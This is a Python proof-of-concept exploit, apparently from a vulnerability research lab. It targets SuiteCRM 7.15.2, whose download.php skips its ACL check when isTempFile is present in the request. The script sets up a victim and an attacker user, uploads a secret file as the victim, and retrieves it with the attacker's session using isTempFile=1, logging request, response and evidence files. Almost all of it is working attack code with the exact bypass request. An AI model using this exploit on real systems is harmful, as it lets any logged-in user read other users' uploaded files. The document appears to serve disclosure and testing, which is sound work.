#!/usr/bin/env python3
"""
VULN-002 -- download.php isTempFile ACL bypass: read any upload/ file by GUID

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:
  download.php:63    -- `if (!isset($_REQUEST['isTempFile'])) { ... ACLAccess('view')
                          check at :101 ... }` -- the ENTIRE module-resolution +
                          ACL block (:63-129) is skipped whenever `isTempFile`
                          is present in the request.
  download.php:150-159 -- `$local_location = "upload://{$_REQUEST['id']}";`
                          (set whenever isTempFile is present, unless ieId+
                          isTempFile or type=="import" -- neither applies here).
  download.php:314    -- `echo clean_file_output(file_get_contents($download_location), ...)`
                          streams the full file bytes.
Auth is session-only (download.php:47 requires
`$_SESSION['authenticated_user_id']` to be set -- any authenticated user).

What this script does
----------------------
1. Creates victim V and attacker A (fresh, unrelated low-priv users).
2. As V: creates a bare Notes record (module=Notes&action=Save), then
   attaches a file to it via the legacy REST method `set_note_attachment`
   (service/v4_1/rest.php) -- this is the same primitive the real Notes
   attachment UI uses; NoteSoap::newSaveFile() writes the file to
   `upload/<note_id>` on disk (confirmed via modules/Notes/NoteSoap.php).
   The file's contents are a random, unique marker string.
3. As A (zero relationship to V's Note): GETs
   entryPoint=download&type=Notes&isTempFile=1&id=<note_id> and asserts
   the raw response bytes match exactly what V uploaded.
4. Control check: also requests the SAME id WITHOUT isTempFile (the
   normal, ACL-checked path) to document, honestly, whether this lab's
   permissive default ACL (no Roles configured) would have allowed the
   read anyway -- see notes.md for the interpretation.

Environment variables:
    BASE_URL, ADMIN_USER, ADMIN_PASS
"""
import base64
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login,
                      rest_login, rest_call)

VULN_ID = "VULN-002"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "download.php isTempFile ACL bypass: read any upload/ file by GUID")

    log("SETUP", "admin web login; provisioning victim (V) and attacker (A)")
    admin = admin_session()
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create a bare Note record")
    note_name = rand("V002Note")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Notes", "action": "Save", "record": "",
        "name": note_name, "description": "seed note for VULN-002",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Notes&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Note (status={r.status_code})")
        sys.exit(1)
    note_id = m.group(1)
    log("OK", f"Note created: {note_id} name={note_name!r}, owned by V")

    log("SETUP", "as V (legacy REST): attach a file to the Note -- writes upload/<note_id> on disk")
    sid = rest_login(victim["user_name"], victim["password"])
    secret_bytes = f"SECRET FILE CONTENTS FOR {VULN_ID} {rand('marker')}".encode()
    res = rest_call("set_note_attachment", [sid, {
        "id": note_id, "filename": "secret002.txt",
        "file": base64.b64encode(secret_bytes).decode(),
    }])
    log("INFO", f"set_note_attachment result: {res}")
    if not res or res.get("id") != note_id:
        verdict(VULN_ID, "FAILED", f"set_note_attachment did not confirm the write: {res}")
        sys.exit(1)
    log("OK", f"file written to upload/{note_id} on the app container, {len(secret_bytes)} bytes")

    as_ = web_login(attacker["user_name"], attacker["password"])

    log("STEP", "as A (zero relationship to V's Note): read it via the isTempFile bypass path")
    bypass_params = {"entryPoint": "download", "type": "Notes", "isTempFile": "1", "id": note_id}
    bypass_url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in bypass_params.items())
    r2 = as_.get(f"{BASE_URL}/index.php", params=bypass_params, timeout=30)
    bytes_match = secret_bytes in r2.content
    log("PROOF", f"bypass response status={r2.status_code} len={len(r2.content)} bytes")
    log("PROOF", f"attacker's response bytes exactly match V's uploaded file: {bytes_match}")

    log("STEP", "control: same id via the NORMAL (ACL-checked, no isTempFile) path -- honesty check")
    control_params = {"entryPoint": "download", "type": "Notes", "id": note_id}
    r3 = as_.get(f"{BASE_URL}/index.php", params=control_params, timeout=30)
    control_bytes_match = secret_bytes in r3.content
    log("INFO", f"control (non-isTempFile) response status={r3.status_code} len={len(r3.content)} "
                f"bytes_match={control_bytes_match} "
                f"(this lab has zero ACL Roles configured, so this path may ALSO succeed -- see notes.md)")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### Bypass request (isTempFile skips the entire ACL block) ###\n")
        f.write(f"GET {bypass_url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write("Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n\n")
        f.write("### Control request (normal path, ACLAccess('view') IS called) ###\n")
        control_url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in control_params.items())
        f.write(f"GET {control_url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write("Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("### Bypass response ###\n")
        f.write(f"HTTP/1.1 {r2.status_code} {r2.reason}\n")
        for k, v in r2.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n--- raw body ---\n")
        f.write(r2.content.decode(errors="replace"))
        f.write("\n\n### Control response (non-isTempFile) ###\n")
        f.write(f"HTTP/1.1 {r3.status_code} {r3.reason}\nbytes_match={control_bytes_match}\n")
        f.write(f"body[:300]={r3.content[:300]!r}\n")

    if not bytes_match:
        verdict(VULN_ID, "FAILED", "attacker did not receive the exact bytes of V's uploaded file")
        sys.exit(1)

    with open(os.path.join(HERE, "evidence", "leaked_file_bytes.txt"), "w") as f:
        f.write(f"Victim Note id: {note_id}\nUploaded (by V) file bytes:\n  {secret_bytes!r}\n\n")
        f.write(f"Bytes returned to attacker via isTempFile bypass:\n  {r2.content!r}\n")
        f.write(f"\nExact match: {bytes_match}\n")
        f.write(f"\nControl (non-isTempFile, ACL-checked path) also succeeded: {control_bytes_match}\n")

    log("OK", "attacker downloaded the exact victim-uploaded file bytes via the isTempFile ACL-skip path")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker read {len(secret_bytes)} bytes of V's upload/{note_id} via isTempFile=1, zero ACL check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
